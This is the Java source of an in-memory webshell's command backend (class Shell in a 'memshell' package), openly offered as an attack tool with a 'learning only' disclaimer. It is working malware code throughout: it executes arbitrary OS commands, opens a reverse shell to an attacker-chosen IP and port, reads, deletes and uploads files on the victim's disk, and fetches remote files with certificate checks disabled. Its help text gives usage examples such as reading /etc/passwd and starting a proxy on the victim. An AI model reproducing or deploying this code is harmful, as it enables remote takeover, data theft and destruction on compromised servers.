package net.rebeyond.memshell;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.cert.CertificateException;
import java.util.Base64;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.security.cert.X509Certificate;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class Shell {

	public static String execute(String cmd) throws Exception {
		String result = "";
		if (cmd != null && cmd.length() > 0) {

			Process p = Runtime.getRuntime().exec(cmd);
			OutputStream os = p.getOutputStream();
			InputStream in = p.getInputStream();
			DataInputStream dis = new DataInputStream(in);
			String disr = dis.readLine();
			while (disr != null) {
				result = result + disr + "\n";
				disr = dis.readLine();
			}
		}
		return result;
	}

	public static String connectBack(String ip, String port) throws Exception {
		class StreamConnector extends Thread {
			InputStream sp;
			OutputStream gh;

			StreamConnector(InputStream sp, OutputStream gh) {
				this.sp = sp;
				this.gh = gh;
			}

			public void run() {
				BufferedReader xp = null;
				BufferedWriter ydg = null;
				try {
					xp = new BufferedReader(new InputStreamReader(this.sp));
					ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
					char buffer[] = new char[8192];
					int length;
					while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
						ydg.write(buffer, 0, length);
						ydg.flush();
					}
				} catch (Exception e) {
				}
				try {
					if (xp != null)
						xp.close();
					if (ydg != null)
						ydg.close();
				} catch (Exception e) {
				}
			}
		}
		try {
			String ShellPath;
			if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
				ShellPath = new String("/bin/sh");
			} else {
				ShellPath = new String("cmd.exe");
			}

			Socket socket = new Socket(ip, Integer.parseInt(port));
			Process process = Runtime.getRuntime().exec(ShellPath);
			(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
			(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
			return "Successful!";
		} catch (Exception e) {
			return e.getMessage();
		}
	}

	public static String help() {
		return "Webshell in Memory:\n\n" + "Usage:\n" + "anyurl?pwd=pass //show this help page.\n"
				+ "anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.\n"
				+ "anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.\n"
				+ "anyurl?pwd=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.\n"
				+ "anyurl?pwd=pass&model=list[del|show]&path=/etc/passwd  //list,delete,show the specified path or file.\n"
				+ "anyurl?pwd=pass&model=download&path=/etc/passwd  //download the specified file on the victim's disk.\n"
				+ "anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.\n"
				+ "anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.\n"
				+ "anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.\n\n"
				+ "For learning exchanges only, do not use for illegal purposes.by rebeyond.\n";
	}

	public static String list(String path) {
		String result = "";
		File f = new File(path);
		if (f.isDirectory()) {
			for (File temp : f.listFiles()) {
				if (temp.isFile()) {
					result = result + (temp.isDirectory()?"r":"-") + "    " + temp.getName() + "   " + temp.length() + "\n";
				}
				else {
					result = result + (temp.isDirectory()?"r":"-")+ "    " + temp.getName() + "   " + temp.length() + "\n";
				}
			}
		} else {
			result = result + f.isDirectory() + "    " + f.getName() + "   " + f.length() + "\n";
		}
		return result;
	}
	public static String delete(String path) {
		String result = "";
		File f = new File(path);
		if (f.isDirectory()) {
			result = deleteDir(f)?"delete directory "+path+" successfully.":"delete "+path+" failed(maybe only some files are not deleted).";
		} else {
			result = f.delete()?"delete "+path+" successfully.":"delete "+path+" failed.";
		}
		return result;
	}
	public static String showFile(String path) throws Exception {
		StringBuffer result= new StringBuffer();
		File f = new File(path);
		if (f.exists()&&f.isFile()) {
            FileReader reader = new FileReader(f);
            BufferedReader br = new BufferedReader(reader);
            String str = null;
            while((str = br.readLine()) != null) {
            	result.append(str+"\n");
            }
            br.close();
            reader.close();
		} 
		return result.toString();
	}
	private static boolean deleteDir(File dir){
		boolean result=true;
		  if(dir.isDirectory()){
		   File[] files = dir.listFiles();
		   for(int i=0; i<files.length; i++) {
		    deleteDir(files[i]);
		   }
		  }
		 if (!dir.delete())
		 {
			 result=false;
		 }
		 return result;
		 }
	public static void download(String path) {
		/*File f = new File(path);
		if (f.isFile()) {
			String fileName = f.getName(); // 文件的默认保存名
			// 读到流中
			InputStream inStream = new FileInputStream(path);// 文件的存放路径
			// 设置输出的格式
			response.reset();
			response.setContentType("bin");
			response.addHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
			// 循环取出流中的数据
			byte[] b = new byte[100];
			int len;
			try {
				while ((len = inStream.read(b)) > 0)
					response.getOutputStream().write(b, 0, len);
				inStream.close();
			} catch (IOException e) {
				e.printStackTrace();
			}

		}*/

	}
	public static String upload(String path,String fileContent,String type) throws Exception
	{
		FileOutputStream fos=new FileOutputStream(path);
		if (type.equalsIgnoreCase("a"))
		{
			fos.write(fileContent.getBytes());
			fos.flush();
		}
		else if(type.equalsIgnoreCase("b"))
		{
			fos.write(Base64.getDecoder().decode(fileContent));
		}
		fos.close();
		return "file " + path + " is upload successfully,and size is " + new File(path).length() + " Byte.";
	}

	public static String urldownload(String url, String path) throws Exception {
		SSLContext sslcontext = SSLContext.getInstance("SSL", "SunJSSE");
		sslcontext.init(null, new TrustManager[] { new X509TrustManager() {

			@Override
			public void checkClientTrusted(java.security.cert.X509Certificate[] arg0, String arg1)
					throws CertificateException {
				// TODO Auto-generated method stub

			}

			@Override
			public void checkServerTrusted(java.security.cert.X509Certificate[] arg0, String arg1)
					throws CertificateException {
				// TODO Auto-generated method stub

			}

			@Override
			public java.security.cert.X509Certificate[] getAcceptedIssuers() {
				// TODO Auto-generated method stub
				return null;
			}

		} }, new java.security.SecureRandom());
		// URL url = new URL(url);
		HostnameVerifier ignoreHostnameVerifier = new HostnameVerifier() {
			public boolean verify(String s, SSLSession sslsession) {
				return true;
			}
		};
		HttpURLConnection urlCon;
		URL downloadUrl=new URL(url);
			HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
			HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
			urlCon = (HttpsURLConnection) downloadUrl.openConnection();
			urlCon.setConnectTimeout(6000);
			urlCon.setReadTimeout(6000);
			int code = urlCon.getResponseCode();
			if (code != HttpURLConnection.HTTP_OK) {
				throw new Exception("文件读取失败");
			}
			// 读文件流
			DataInputStream in = new DataInputStream(urlCon.getInputStream());
			DataOutputStream out = new DataOutputStream(new FileOutputStream(path));
			byte[] buffer = new byte[2048];
			int count = 0;
			while ((count = in.read(buffer)) > 0) {
				out.write(buffer, 0, count);
				out.flush();
			}
			out.close();
			in.close();
		return "file " + path + " downloaded successfully,and size is " + new File(path).length() + " Byte.";
	}

	public static void main(String[] args) {
		try {
			// System.out.println(Shell.execute("net user").replace("\n", "aaaaaaaaaaa"));
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void eval(ServletRequest request, ServletResponse response) throws Exception {
		/*
		 * Class c=Class.forName("javax/servlet/ServletRequest");
		 * System.out.println("classs is :"+c); Evaluate eval=new Evaluate();
		 * eval.doGet(request, response);
		 */
	}
}
